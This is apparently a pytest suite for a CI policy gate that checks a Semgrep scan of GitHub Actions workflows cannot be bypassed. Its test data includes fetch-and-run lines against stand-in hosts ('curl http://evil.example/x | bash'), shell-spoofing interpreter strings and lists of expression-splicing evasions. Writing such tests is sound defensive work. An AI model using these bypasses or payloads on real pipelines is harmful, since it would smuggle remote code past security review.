        sorted(policy.SEMGREP_POWERSHELL_RULES)[0],
        script='echo "${{ github.sha }}"',
    )

    assert _semgrep_return_code(target, error, tmp_path) == 0


@pytest.mark.parametrize(
    "shell",
    [
        "pwsh",
        "powershell",
        "python3",
        "python3 {0}",
    ],
)
def test_non_bash_shells_defeat_the_bash_subparse(shell: str) -> None:
    assert policy._is_non_bash_shell(shell) is True


@pytest.mark.parametrize("shell", ["PowerShell", "PWSH", "Python3", "PowerShell {0}"])
def test_an_interpreter_token_must_be_exact_and_lowercase(shell: str) -> None:
    """A cased spelling is not a declared shell, so it must not earn an exemption.

    `_is_non_bash_shell` gates an exemption: True skips the Bash scan. The
    measured shells in `.github/workflows/` are 28 `bash`, 33 `pwsh` (14 bare
    and 19 through the call-operator template), and 2 `python3 {0}`. Nothing
    declares a cased spelling, so accepting one buys exempt surface for no
    caller. Refusing it is fail-closed: the body gets Bash-scanned and a parse
    error blocks the push instead of passing silently.
    """
    assert policy._is_non_bash_shell(shell) is False


@pytest.mark.parametrize(
    "shell",
    [
        "python",
        "python {0}",
        "Python",
        "python2",
        "python2 {0}",
    ],
)
def test_bare_python_is_not_an_exempt_shell(shell: str) -> None:
    """A shell no workflow declares must not earn a sub-parse exemption.

    `_is_non_bash_shell` gates an exemption, not a warning: a match makes
    `_step_defeats_bash_subparse` return True and the body skips the Bash
    scan. Measured across `.github/workflows/`, the declared shells are 38
    `pwsh`, 29 `bash`, and 2 `python3`. No step declares `python`, so the
    `python3?` form widened the exempt surface for nothing.

    `python` is a valid GitHub Actions shell keyword, so this is a
    fail-closed narrowing rather than a correctness fix: a future
    `shell: python` step would be Bash-scanned instead of exempted. Adding
    it back is a deliberate act with a workflow to point at.
    """
    assert policy._is_non_bash_shell(shell) is False


PWSH_CALL_TEMPLATE = """pwsh -NoProfile -Command "& '{0}'\""""


@pytest.mark.parametrize(
    "body",
    [
        "#!/bin/bash\ncurl http://evil.example/x | bash\nif [\n",
        "#!/bin/sh\ncurl http://evil.example/x | sh\nif [\n",
        "#!/usr/bin/env bash\ncurl http://evil.example/x | bash\nif [\n",
        "\n\n#!/bin/bash\ncurl http://evil.example/x | bash\nif [\n",
        "#!/usr/bin/python3\nimport os\nos.system('curl http://evil.example/x | bash')\nif [\n",
    ],
)
def test_a_shebang_body_is_never_tolerated_under_a_foreign_shell(body: str) -> None:
    """A `#!` line, not the `shell:` value, decides what executes the body.

    The runner writes a custom-shell body to an executable temp file. PowerShell's
    call operator hands that file to the OS rather than parsing it, the kernel
    honours the shebang, and Bash runs the body. Bash executes every command
    before a syntax error, so a trailing `if [` hides a Semgrep finding while the
    payload above it still runs. Verified locally: with the shebang the payload
    runs under this exact template; without it the exec fails.
    """
    assert policy._step_defeats_bash_subparse(PWSH_CALL_TEMPLATE, body) is False


@pytest.mark.parametrize(
    "body",
    [
        "$ErrorActionPreference = 'Stop'\nif ($x) { Write-Host 1 }\n",
        "Write-Host 'hello'\n",
        "# a comment that is not a shebang\nWrite-Host 'hi'\n",
        "#not-a-shebang\nWrite-Host 'hi'\n",
    ],
)
def test_shebangless_bodies_still_tolerate_under_a_foreign_shell(body: str) -> None:
    """The guard must not cost the 16 real workflow files their carve-out."""
    assert policy._step_defeats_bash_subparse(PWSH_CALL_TEMPLATE, body) is True


@pytest.mark.parametrize(
    "shell",
    [
        None,
        "bash",
        "sh",
        "bash --noprofile --norc -eo pipefail {0}",
        "bash -e {0}",
        "bash -c 'python script.py'",
        "nodejs",
        "cmdline",
    ],
)
def test_bash_shells_do_not_defeat_the_bash_subparse(shell: str | None) -> None:
    assert policy._is_non_bash_shell(shell) is False


@pytest.mark.parametrize(
    "shell",
    [
        # The Actions runner's extension table has no `.exe` keys, so these are
        # written without an extension and PowerShell's call operator hands the
        # file to the OS, which honours a `#!/bin/bash` first line.
        "PowerShell.exe",
        "powershell.exe",
        "pwsh.exe -NoProfile",
        "pwsh.exe -NoProfile -Command \"& '{0}'\"",
        # perl execs the interpreter named in a foreign `#!` line.
        "perl",
        "perl {0}",
        # Interpreters this repository does not use are not on the allowlist.
        "node",
        "ruby",
        "cmd /C",
        "cmd /S /C",
        # `cmd.exe` accepts a glued `/c<command>`, which `\b` cannot see.
        "cmd /cbash {0}",
        # Reaching a POSIX shell without ever spelling one.
        "python3 -c \"import os,sys; os.system('bash ' + sys.argv[1])\" {0}",
        "python3 -c \"import subprocess; subprocess.run(['x'], shell=True)\" {0}",
        "python3 -c \"'bas'+'h'\" {0}",
        'pwsh -c "& $env:SHELL {0}"',
        "pwsh -c 'bas`h {0}'",
        # Unbalanced quoting cannot be tokenized, so it fails closed.
        "pwsh -Command \"& '{0}'",
    ],
)
def test_bypass_shapes_do_not_defeat_the_bash_subparse(shell: str) -> None:
    """Every shape #3683 demonstrated must classify as Bash-reachable."""
    assert policy._is_non_bash_shell(shell) is False


@pytest.mark.parametrize(
    "body",
    [
        'echo "${{ github.sha }}"',
        "echo ${{matrix.os}}",
        "echo ${{\n  github.sha\n}}",
    ],
)
@requires_bash
def test_actions_expressions_defeat_the_bash_subparse(body: str) -> None:
    assert policy._step_defeats_bash_subparse("bash", body) is True


@pytest.mark.parametrize(
    "body",
    ["echo hello", "echo ${HOME}", "echo $ {{ github.sha }}", "echo ${{}}"],
)
def test_plain_bash_bodies_do_not_defeat_the_bash_subparse(body: str) -> None:
    assert policy._step_defeats_bash_subparse("bash", body) is False


def test_semgrep_blocks_an_aliased_script_reused_under_a_bash_step(tmp_path: Path) -> None:
    target = tmp_path / "workflow.yml"
    content = (
        "jobs:\n"
        "  build:\n"
        "    steps:\n"
        "      - shell: pwsh\n"
        "        run: &script |\n"
        "          Write-Host 'hi'\n"
        "      - shell: bash\n"
        "        run: *script\n"
    )
    _write_lf(target, content)
    error = _powershell_partial_parsing_error(target, line=5)
    _retarget_span(error, content, "Write-Host 'hi'")

    assert _semgrep_return_code(target, error, tmp_path) == 2


@requires_bash
def test_tolerated_errors_never_downgrade_a_semgrep_finding(tmp_path: Path) -> None:
    """A tolerated parse error must not mask a real finding.

    Semgrep reports ``curl | sh`` as a finding even when the same ``run:`` block
    also triggers a Bash sub-parse failure, so the carve-out must pass semgrep's
    own verdict through untouched rather than reporting success.
    """
    target = tmp_path / "workflow.yml"
    _write_lf(target, _ACTIONS_EXPRESSION_WORKFLOW)
    error = _powershell_partial_parsing_error(target, line=5)
    _retarget_span(error, _ACTIONS_EXPRESSION_WORKFLOW, "curl http://example.test | sh")
    payload = {"errors": [error], "paths": {"scanned": [str(target)]}}

    result = policy._verify_semgrep_targets(
        _completed(1, json.dumps(payload)),
        [str(target)],
        tmp_path,
    )

    assert result.returncode == 1


@requires_bash
def test_tolerated_errors_do_not_suppress_findings_reported_alongside_them(
    tmp_path: Path,
) -> None:
    """The carve-out inspects only the error manifest, never the results list."""
    target = tmp_path / "workflow.yml"
    _write_lf(target, _ACTIONS_EXPRESSION_WORKFLOW)
    error = _powershell_partial_parsing_error(target, line=5)
    _retarget_span(error, _ACTIONS_EXPRESSION_WORKFLOW, "curl http://example.test | sh")
    payload = {
        "errors": [error],
        "results": [{"check_id": "yaml.github-actions.security.gha-curl-pipe-shell"}],
        "paths": {"scanned": [str(target)]},
    }

    result = policy._verify_semgrep_targets(
        _completed(1, json.dumps(payload)),
        [str(target)],
        tmp_path,
    )

    assert result.returncode == 1
    assert "gha-curl-pipe-shell" in result.stdout


_MALFORMED_EXPRESSION_WORKFLOW = (
    "jobs:\n"
    "  build:\n"
    "    steps:\n"
    "      - shell: bash\n"
    "        run: |\n"
    '          echo "${{ github.sha }}"\n'
    "          curl http://example.test | sh\n"
    "          function ( {\n"
)

_SPOOFED_SHELL_WORKFLOW = (
    "jobs:\n"
    "  build:\n"
    "    steps:\n"
    "      - shell: python3 -c \"import os,sys; os.system('bash ' + sys.argv[1])\" {0}\n"
    "        run: |\n"
    "          curl http://example.test | sh\n"
    "          function ( {\n"
)


def test_semgrep_blocks_a_malformed_bash_body_that_carries_an_expression(
    tmp_path: Path,
) -> None:
    """A deliberate syntax error must not ride an Actions expression to safety.

    Semgrep reports zero findings and only parse errors for this body, so
    tolerating the error would let ``curl | sh`` through unscanned.
    """
    target = tmp_path / "workflow.yml"
    _write_lf(target, _MALFORMED_EXPRESSION_WORKFLOW)
    error = _powershell_partial_parsing_error(target, line=5)
    _retarget_span(error, _MALFORMED_EXPRESSION_WORKFLOW, "curl http://example.test | sh")

    assert _semgrep_return_code(target, error, tmp_path) == 2


def test_semgrep_blocks_a_shell_that_declares_python_but_invokes_bash(
    tmp_path: Path,
) -> None:
    """A ``shell:`` value naming a second interpreter cannot be trusted."""
    target = tmp_path / "workflow.yml"
    _write_lf(target, _SPOOFED_SHELL_WORKFLOW)
    error = _powershell_partial_parsing_error(target, line=5)
    _retarget_span(error, _SPOOFED_SHELL_WORKFLOW, "curl http://example.test | sh")

    assert _semgrep_return_code(target, error, tmp_path) == 2


@pytest.mark.parametrize(
    "shell",
    [
        "pwsh",
        "pwsh -NoProfile -Command \"& '{0}'\"",
        "python3 {0}",
        "powershell",
    ],
)
def test_shells_naming_only_their_own_interpreter_are_non_bash(shell: str) -> None:
    assert policy._is_non_bash_shell(shell) is True


@pytest.mark.parametrize(
    "shell",
    [
        "python3 -c \"import os,sys; os.system('bash ' + sys.argv[1])\" {0}",
        'python3 -c \'import subprocess; subprocess.run(["sh", "x"])\'',
        "node -e \"require('child_process').execSync('bash x')\"",
        "perl -e 'exec q{zsh}'",
    ],
)
def test_shells_naming_a_foreign_interpreter_are_not_treated_as_non_bash(shell: str) -> None:
    assert policy._is_non_bash_shell(shell) is False


@pytest.mark.parametrize(
    "shell",
    [
        "node ./tools/wrapper.js {0}",
        "node tools/wrapper.js {0}",
        "node wrapper.js {0}",
        "node /usr/local/lib/run {0}",
        "pwsh -File C:\\tools\\run.ps1",
        "pwsh -File '~/x.ps1'",
        'cmd /C "call build.bat"',
    ],
)
def test_shells_delegating_to_a_script_file_are_not_treated_as_non_bash(shell: str) -> None:
    assert policy._is_non_bash_shell(shell) is False


@pytest.mark.parametrize(
    "shell",
    [
        "python-shim {0}",
        "python3-wrapper {0}",
        "pythonic-thing {0}",
        "nodejs-runner {0}",
        "powershell.exe.evil/x {0}",
    ],
)
def test_shells_merely_prefixed_by_an_interpreter_are_not_treated_as_non_bash(shell: str) -> None:
    assert policy._is_non_bash_shell(shell) is False


@pytest.mark.parametrize("shell", ["cmd /C", "cmd /S /C", "powershell.exe", "pwsh.exe -NoProfile"])
def test_windows_shell_forms_outside_the_allowlist_are_not_non_bash(shell: str) -> None:
    """`.exe` misses the runner extension table and `cmd` accepts a glued switch.

    Both were tolerated before #3683 and both reach Bash, so both now block.
    """
    assert policy._is_non_bash_shell(shell) is False


def test_block_scalar_trailing_blank_lines_still_match_their_own_snippet() -> None:
    """A `|+` body keeps trailing blank lines; the snippet arrives stripped.

    Leaving the body unstripped inflated its line count, so the real step failed
    to match its own snippet and dropped out of the tolerated list. Refs #3673.
    """
    snippet = "echo one\necho two"
    run_with_trailing_blanks = "echo one\necho two\n\n\n"

    assert policy._semgrep_snippet_matches_run(
        snippet,
        run_with_trailing_blanks,
        truncated=False,
    )


def test_block_scalar_leading_blank_lines_still_match_their_own_snippet() -> None:
    snippet = "echo one\necho two"

    assert policy._semgrep_snippet_matches_run(
        snippet,
        "\n\necho one\necho two\n",
        truncated=False,
    )


def test_a_body_with_extra_real_lines_still_fails_to_match() -> None:
    """Stripping must not weaken the line-count equality for real content."""
    assert not policy._semgrep_snippet_matches_run(
        "echo one",
        "echo one\necho two",
        truncated=False,
    )


@pytest.mark.parametrize(
    "expected",
    ["✓✓✓✓", "日本語", "→→→", "é"],
)
def test_an_all_non_ascii_expected_line_matches_nothing(expected: str) -> None:
    """Non-ASCII acts as a wildcard, so an all-non-ASCII line was all wildcard.

    That let a decoy step claim an unrelated snippet and displace the real step
    from the tolerated list. Require at least one ASCII anchor. Refs #3673.
    """
    assert not policy._semgrep_line_matches_run_line("curl evil | bash", expected)
    assert not policy._semgrep_line_matches_run_line("anything at all", expected)


def test_an_expected_line_with_one_ascii_anchor_still_matches() -> None:
    assert policy._semgrep_line_matches_run_line("X safe", "✓ safe")


def test_an_empty_expected_line_matches_an_empty_observed_line() -> None:
    assert policy._semgrep_line_matches_run_line("", "")


@pytest.mark.parametrize(
    ("raw", "offset", "expected"),
    [
        (b"abc", 0, 0),
        (b"abc", 3, 3),
        # Four bytes of multibyte content are two characters.
        ("é✓".encode(), 5, 2),
        ("é".encode(), 2, 1),
    ],
)
def test_byte_offsets_convert_to_character_indexes(
    raw: bytes,
    offset: int,
    expected: int,
) -> None:
    assert policy._byte_offset_to_char_index(raw, offset) == expected


@pytest.mark.parametrize(
    ("raw", "offset"),
    [
        (b"abc", -1),
        (b"abc", 4),
        # Mid-character offsets cannot be located, so the span is dropped.
        ("é".encode(), 1),
        ("✓".encode(), 2),
    ],
)
def test_unlocatable_byte_offsets_fail_closed(raw: bytes, offset: int) -> None:
    """`None` drops the span, which empties the match list and blocks the push."""
    assert policy._byte_offset_to_char_index(raw, offset) is None


def test_partial_parsing_spans_use_character_indexes_after_multibyte_content(
    tmp_path: Path,
) -> None:
    """PyYAML indexes characters while Semgrep reports bytes. Refs #3672."""
    rule_id = sorted(policy.SEMGREP_POWERSHELL_RULES)[0]
    target = tmp_path / "workflow.yml"
    raw = "# ✓✓✓\nrun: echo hi\n".encode()
    target.write_bytes(raw)
    prefix_bytes = len("# ✓✓✓\n".encode())

    spans = policy._powershell_partial_parsing_spans(
        {
            "code": 3,
            "type": [
                "PartialParsing",
                [
                    {
                        "path": str(target),
                        "start": {"line": 2, "col": 1, "offset": prefix_bytes},
                        "end": {"line": 2, "col": 13, "offset": len(raw)},
                    }
                ],
            ],
        },
        f"When parsing a snippet as Bash for metavariable-pattern in rule '{rule_id}',",
        target,
        tmp_path,
        raw,
    )

    assert spans == [(2, 2, len("# ✓✓✓\n"), len(raw.decode("utf-8")))]
    # The byte offset would have overshot by three, proving the conversion ran.
    assert spans[0][2] != prefix_bytes


@pytest.mark.parametrize("shell", ["powershell", "pwsh -NoProfile", "python3"])
def test_windows_shell_flags_stay_non_bash(shell: str) -> None:
    assert policy._is_non_bash_shell(shell) is True


@pytest.mark.parametrize(
    "shell",
    [
        "powershell.exe",
        "pwsh.exe -NoProfile",
        "pwsh.exe -NoProfile -Command \"& '{0}'\"",
        "python3.exe {0}",
    ],
)
def test_exe_suffixed_interpreters_are_never_tolerated(shell: str) -> None:
    """An `.exe` first token misses the runner's extension table.

    The runner names the temp script from a fixed table keyed on the first
    token. `pwsh` yields `.ps1`, which PowerShell parses itself, but `pwsh.exe`
    is absent from that table and yields a file with no extension, which
    PowerShell hands to the OS. A `#!/bin/bash` body then runs under Bash while
    the `shell:` value claims PowerShell. No workflow here uses an `.exe` form.
    """
    assert policy._is_non_bash_shell(shell) is False


@pytest.mark.parametrize(
    "shell",
    [
        "cmd",
        "cmd /C",
        "cmd /cbash {0}",
        "cmd /kbash {0}",
        'cmd "/cbash"',
        "node",
        "node {0}",
        "ruby",
        "perl",
        "perl {0}",
    ],
)
def test_interpreters_outside_the_allowlist_are_never_tolerated(shell: str) -> None:
    """`cmd` glues its command to the switch and `perl` obeys a `#!` line.

    Neither can be cleared by reading the `shell:` value, and neither is used in
    this repository, so both stay outside the allowlist.
    """
    assert policy._is_non_bash_shell(shell) is False


@pytest.mark.parametrize(
    "shell",
    [
        "pwsh -Command bas`h {0}",
        'pwsh -c "& $env:SHELL {0}"',
        "python3 -c \"import os,sys; os.system('bas'+'h '+sys.argv[1])\" {0}",
        'python3 -c "import os,sys;os.system(open(sys.argv[1]).read())" {0}',
        'python3 -c "import subprocess,sys;subprocess.run(open(sys.argv[1]).read())" {0}',
        "pwsh /cbash {0}",
        "python3 --shell=bash {0}",
    ],
)
def test_inline_programs_reaching_a_posix_shell_are_never_tolerated(shell: str) -> None:
    """A template may reach `/bin/sh` without naming it, so only inert tokens pass."""
    assert policy._is_non_bash_shell(shell) is False


def test_resolve_bash_prefers_the_interpreter_on_path(monkeypatch: pytest.MonkeyPatch) -> None:
    policy._resolve_bash.cache_clear()
    monkeypatch.setattr(policy.shutil, "which", lambda _name: "/opt/bin/bash")
    try:
        assert policy._resolve_bash() == "/opt/bin/bash"
    finally:
        policy._resolve_bash.cache_clear()


def test_resolve_bash_falls_back_to_git_for_windows(monkeypatch: pytest.MonkeyPatch) -> None:
    """Windows runners expose Git's `cmd` directory but not its `bin` directory."""
    policy._resolve_bash.cache_clear()
    monkeypatch.setattr(policy.shutil, "which", lambda _name: None)
    wanted = policy.WINDOWS_BASH_FALLBACKS[0]
    monkeypatch.setattr(policy.Path, "is_file", lambda self: str(self) == wanted)
    try:
        assert policy._resolve_bash() == wanted
    finally:
        policy._resolve_bash.cache_clear()


def test_resolve_bash_returns_none_when_no_interpreter_exists(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    policy._resolve_bash.cache_clear()
    monkeypatch.setattr(policy.shutil, "which", lambda _name: None)
    monkeypatch.setattr(policy.Path, "is_file", lambda self: False)
    try:
        assert policy._resolve_bash() is None
    finally:
        policy._resolve_bash.cache_clear()


def test_syntax_check_fails_closed_without_bash(monkeypatch: pytest.MonkeyPatch) -> None:
    """A host with no Bash must block, never tolerate an unverifiable body."""
    policy._resolve_bash.cache_clear()
    policy._body_is_valid_shell_syntax.cache_clear()
    monkeypatch.setattr(policy.shutil, "which", lambda _name: None)
    monkeypatch.setattr(policy.Path, "is_file", lambda self: False)
    monkeypatch.setattr(
        policy.subprocess,
        "run",
        lambda *_args, **_kwargs: pytest.fail("bash must not be invoked when unresolved"),
    )
    try:
        assert policy._body_is_valid_shell_syntax("echo hello\n") is False
        assert policy._step_defeats_bash_subparse("bash", 'echo "${{ github.sha }}"\n') is False
    finally:
        policy._resolve_bash.cache_clear()
        policy._body_is_valid_shell_syntax.cache_clear()


@pytest.mark.parametrize(
    "body",
    [
        'if [ "${{ github.sha }}" = "x" ]; then\n  echo hi\nfi\n',
        "echo hello\n",
        'echo "unterminated is fine when quoted properly"\n',
    ],
)
@requires_bash
def test_valid_shell_bodies_pass_the_syntax_check(body: str) -> None:
    assert policy._body_is_valid_shell_syntax(body) is True


@pytest.mark.parametrize(
    "body",
    [
        "function ( {\n",
        "if [ -f /tmp/x ]; then\n",
        "case $x in\n",
        'echo "unterminated\n',
    ],
)
def test_malformed_shell_bodies_fail_the_syntax_check(body: str) -> None:
    assert policy._body_is_valid_shell_syntax(body) is False


def test_syntax_check_fails_closed_when_bash_is_unavailable(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    """A missing or unusable bash must block rather than silently tolerate."""

    def _explode(*_args: object, **_kwargs: object) -> None:
        raise FileNotFoundError("bash")

    policy._body_is_valid_shell_syntax.cache_clear()
    monkeypatch.setattr(policy.subprocess, "run", _explode)
    try:
        assert policy._body_is_valid_shell_syntax("echo hi  # unique-for-cache\n") is False
    finally:
        policy._body_is_valid_shell_syntax.cache_clear()


def test_syntax_check_fails_closed_when_bash_times_out(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    def _timeout(*_args: object, **_kwargs: object) -> None:
        raise subprocess.TimeoutExpired(cmd=["bash", "-n"], timeout=1)

    policy._body_is_valid_shell_syntax.cache_clear()
    monkeypatch.setattr(policy.subprocess, "run", _timeout)
    try:
        assert policy._body_is_valid_shell_syntax("echo hi  # timeout-case\n") is False
    finally:
        policy._body_is_valid_shell_syntax.cache_clear()


@requires_bash
def test_expression_path_requires_a_parseable_body() -> None:
    assert policy._step_defeats_bash_subparse("bash", 'echo "${{ github.sha }}"\n') is True
    assert policy._step_defeats_bash_subparse("bash", 'echo "${{ github.sha }}"\nif [\n') is False


def test_non_bash_shell_path_does_not_require_a_parseable_body() -> None:
    """A Python step is legitimately unparseable as Bash and stays tolerated."""
    assert policy._step_defeats_bash_subparse("python3 {0}", "print(os.getcwd())\n") is True


def test_process_output_flushes_stdout_before_writing_stderr(
    capfd: pytest.CaptureFixture[str],
) -> None:
    """The reason must reach the operator above the error that needs it.

    lefthook pipes stdout, so Python block-buffers it while stderr stays
    unbuffered. Without the flush the error overtakes its own explanation and
    the reason lands under the next hook's group header. Refs #3627.
    """
    flushed: list[str] = []
    real_flush = sys.stdout.flush

    def _record() -> None:
        flushed.append("stdout")
        real_flush()

    result = subprocess.CompletedProcess(
        args=["check"], returncode=1, stdout="no open PR for feat/x\n", stderr=""
    )
    with mock.patch.object(sys.stdout, "flush", _record):
        policy._print_process_output(result)
    assert flushed == ["stdout"]
    assert capfd.readouterr().out == "no open PR for feat/x\n"


def test_process_output_does_not_flush_when_there_is_no_stdout() -> None:
    """Negative control: an empty stdout stays a no-op rather than a flush."""
    flushed: list[str] = []
    result = subprocess.CompletedProcess(
        args=["check"], returncode=1, stdout="", stderr="ERROR: blocked\n"
    )
    with mock.patch.object(sys.stdout, "flush", lambda: flushed.append("stdout")):
        policy._print_process_output(result)
    assert flushed == []


# ---------------------------------------------------------------------------
# Adversarial review of the Semgrep gate (PR #3688). Four bypasses, each with a
# negative control proving the fix does not over-tighten. Refs #3673.
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "shell",
    [
        "python3 -mevil {0}",
        "python -mhttp.server {0}",
        "python3 -c print(1) {0}",
        "PYTHON3 -MEVIL {0}",
    ],
)
def test_unreviewed_interpreter_flag_is_not_a_reviewed_shell(shell: str) -> None:
    """CPython runs ``-m`` and ignores the script, so the step is not reviewed.

    Before the fix a generic flag regex accepted any ``-x`` token, so this
    classified as a reviewed non-Bash interpreter and skipped every Bash rule
    while the runner executed the attacker's module. CWE-78.
    """
    assert policy._is_non_bash_shell(shell) is False


@pytest.mark.parametrize(
    "shell",
    [
        "python3 {0}",
        "pwsh -NoProfile -Command \"& '{0}'\"",
        "pwsh -noprofile -nologo -command \"& '{0}'\"",
        "pwsh",
    ],
)
def test_reviewed_interpreter_invocations_stay_tolerated(shell: str) -> None:
    """Negative control: every shell value used in this repository still passes."""
    assert policy._is_non_bash_shell(shell) is True


@pytest.mark.parametrize(
    "run",
    [
        "c${{ '' }}url https://evil.sh | sh",
        "echo hi; c${{ '' }}url x | sh",
        "foo && b${{ '' }}ash -c evil",
        "wget x\nc${{ '' }}url y | sh",
    ],
)
def test_expression_spliced_into_a_command_word_denies_the_tolerance(run: str) -> None:
    """Actions reassembles the command after every scanner has read the text.

    The body parses as Bash and carries an expression, so the tolerance used to
    excuse the Semgrep error and the hidden ``curl | sh`` shipped. CWE-78.
    """
    assert policy._splices_expression_into_command_word(run) is True
    assert policy._step_defeats_bash_subparse("bash", run) is False


@pytest.mark.parametrize(
    "run",
    [
        'echo "#${{ github.event.pull_request.number }}"',
        "gh pr view ${{ github.sha }}",
        'echo "quarterly-${{ github.run_id }}"',
        "curl ${{ github.server_url }}/${{ github.repository }}/x",
        "${{ inputs.cmd }} --flag",
        "echo no expression here",
    ],
)
def test_argument_position_expressions_keep_the_tolerance(run: str) -> None:
    """Negative control: the shapes real workflows use are untouched.

    All 17 expression-bearing Bash steps in ``.github/workflows`` place the
    expression in argument or string position. None is denied by the new rule.
    """
    assert policy._splices_expression_into_command_word(run) is False


def test_wildcard_line_requires_a_printable_anchor() -> None:
    """A run of non-ASCII plus spaces matched an unrelated command line.

    Non-ASCII runs act as wildcards, so ``'\u2713 \u2713 \u2713'`` aligned with
    ``curl evil.sh | sh`` and marked a real finding as an expected line.
    """
    assert (
        policy._semgrep_line_matches_pattern(
            "\u2713 \u2713 \u2713", "curl evil.sh | sh", allow_expected_suffix=False
        )
        is False
    )


@pytest.mark.parametrize(
    ("expected", "actual"),
    [
        ("", ""),
        ("echo hi", "echo hi"),
        ("  echo hi", "  echo hi"),
        ("echo \u2713 done", "echo \u2713 done"),
    ],
)
def test_anchor_guard_leaves_ordinary_lines_matching(expected: str, actual: str) -> None:
    """Negative control: blank interior lines of a ``run:`` block still match.

    ``_semgrep_snippet_matches_run`` splits the body on newlines, so an empty
    expected line is normal. Requiring an anchor unconditionally would have
    dropped every step containing a blank line.
    """
    assert (
        policy._semgrep_line_matches_pattern(expected, actual, allow_expected_suffix=False) is True
    )


def test_char_index_map_matches_the_per_offset_converter() -> None:
    """The single-pass map is exactly equivalent, including the rejections."""
    raw = "a\u00e9b\u20acc\U0001f600d\ne\u00e9\n".encode()
    mapping = policy._utf8_char_index_map(raw)
    assert mapping is not None
    for offset in range(-2, len(raw) + 3):
        assert mapping.get(offset) == policy._byte_offset_to_char_index(raw, offset)


def test_char_index_map_declines_a_file_that_is_not_utf8() -> None:
    """A file that fails to decode falls back to the per-offset path.

    Returning a partial map would turn an offset inside the decodable prefix
    into ``None``, which drops the span and blocks the push.
    """
    raw = b"abc\xff\xfedef"
    assert policy._utf8_char_index_map(raw) is None
    assert policy._byte_offset_to_char_index(raw, 3) == 3


# Adversarial review round 2: sixteen ways an expression reaches command
# position without crossing a separator character. Refs #3673.
_COMMAND_POSITION_EVASIONS = (
    pytest.param('"c${{ github.event.number }}url" http://x | sh', id="double-quoted-word"),
    pytest.param("'c'${{ github.event.number }}'url' http://x | sh", id="single-quote-glue"),
    pytest.param("c\\\n${{ github.event.number }}url http://x | sh", id="line-continuation"),
    pytest.param("c\\ ${{ github.event.number }}url http://x", id="escaped-space"),
    pytest.param("$(echo c)${{ github.event.number }}url http://x", id="command-substitution"),
    pytest.param("`echo c`${{ github.event.number }}url http://x", id="backtick-substitution"),
    pytest.param("${PREFIX}${{ github.event.number }}url http://x", id="parameter-expansion"),
    pytest.param("if true; then c${{ github.event.number }}url http://x; fi", id="after-then"),
    pytest.param("for i in 1; do c${{ github.event.number }}url http://x; done", id="after-do"),
    pytest.param(
        "if false; then :; else c${{ github.event.number }}url http://x; fi",
        id="after-else",
    ),
    pytest.param("! c${{ github.event.number }}url http://x", id="after-bang"),
    pytest.param("c${{ github.event.number }}url http://x >/dev/null", id="before-redirect"),
    pytest.param("cat </dev/null; c${{ github.event.number }}url http://x", id="after-redirect"),
    pytest.param("FOO=bar c${{ github.event.number }}url http://x", id="assignment-prefix"),
    pytest.param("eval c${{ github.event.number }}url http://x", id="eval-argument"),
    pytest.param(
        "printf 'c${{ github.event.number }}url http://x' | xargs -0 bash -c",
        id="piped-into-shell",
    ),
)


@pytest.mark.parametrize("run", _COMMAND_POSITION_EVASIONS)
def test_expression_splices_are_detected_in_every_command_position(run: str) -> None:
    """Every adversarial shape that reaches a command word is refused tolerance.

    Each case glues an expression onto ``c...url`` so Actions rebuilds ``curl``
    after Semgrep has already read the file. Tolerating the resulting parse
    error would wave the step through.
    """
    assert policy._splices_expression_into_command_word(run) is True


def test_separator_scan_negative_control_is_defeated_by_most_of_the_corpus() -> None:
    """Prove the old separator scan misses the majority of these evasions."""
    old_separator = re.compile(r"[\n;&|(]")
    old_partial = re.compile(r"[\w./-]+")

    def old_check(run: str) -> bool:
        for match in policy.ACTIONS_EXPRESSION_RE.finditer(run):
            segment = old_separator.split(run[: match.start()])[-1].lstrip()
            if segment and old_partial.fullmatch(segment):
                return True
        return False

    missed = [
        text
        for case in _COMMAND_POSITION_EVASIONS
        if not old_check(text := cast(str, case.values[0]))
    ]
    assert len(missed) > len(_COMMAND_POSITION_EVASIONS) // 2


_ARGUMENT_POSITION_SHAPES = (
    pytest.param('echo "${{ github.event.number }}"', id="quoted-argument"),
    pytest.param("gh pr view ${{ github.event.number }} --json title", id="bare-argument"),
    pytest.param('if [ "${{ inputs.mode }}" = "x" ]; then echo hi; fi', id="test-condition"),
    pytest.param("curl http://x | sh # ${{ inputs.mode }}", id="trailing-comment"),
    pytest.param('printf "%s" "${{ inputs.mode }}" > out.txt', id="redirect-argument"),
    pytest.param("MODE=${{ inputs.mode }} ./run.sh", id="assignment-value"),
    pytest.param("${{ inputs.cmd }} --flag", id="lone-expression"),
    pytest.param('echo "a ${{ inputs.mode }} b" | tee log', id="inside-string-piped"),
    pytest.param("cat <<EOF\n${{ inputs.mode }}\nEOF", id="heredoc-body"),
    pytest.param("./run.sh --mode=${{ inputs.mode }}", id="flag-value"),
)


@pytest.mark.parametrize("run", _ARGUMENT_POSITION_SHAPES)
def test_argument_position_expressions_are_not_treated_as_splices(run: str) -> None:
    """Real workflow shapes keep their tolerance.

    Narrowing the check until it caught the evasions is only safe if it leaves
    ordinary usage alone; every shape here appears in real workflows, and a
    lone expression is raw interpolation that its own validation covers.
    """
    assert policy._splices_expression_into_command_word(run) is False


def test_shell_sink_promotion_stays_inside_its_own_pipeline() -> None:
    """A sink elsewhere in the body does not promote an unrelated expression.

    ``curl ... | sh`` guarded by an expression condition is the exact shape the
    tolerance exists for. Promoting every word in the body once any sink
    appeared anywhere would refuse it.
    """
    run = 'if [ "${{ steps.filter.outputs.agents }}" = "true" ]; then\n  curl http://x | sh\nfi'
    assert policy._splices_expression_into_command_word(run) is False


# Adversarial review round 3 against the tokenizer that replaced the separator
# scan. Sixty-five shapes were probed; these are the twenty-three that defeated
# the first tokenizer. Refs #3673.
_TOKENIZER_EVASIONS = (
    pytest.param('bash <<< "c${{ inputs.x }}url http://y | sh"', id="here-string"),
    pytest.param("coproc c${{ inputs.x }}url http://y", id="coproc"),
    pytest.param("builtin c${{ inputs.x }}url http://y", id="builtin-prefix"),
    pytest.param("sudo c${{ inputs.x }}url http://y", id="sudo-prefix"),
    pytest.param("setsid c${{ inputs.x }}url http://y", id="setsid-prefix"),
    pytest.param("stdbuf -o0 c${{ inputs.x }}url http://y", id="stdbuf-prefix"),
    pytest.param("case x in\n  x) c${{ inputs.x }}url http://y ;;\nesac", id="case-pattern"),
    pytest.param(
        "case x in\n  x) : ;& y) c${{ inputs.x }}url http://y ;;\nesac",
        id="case-fallthrough",
    ),
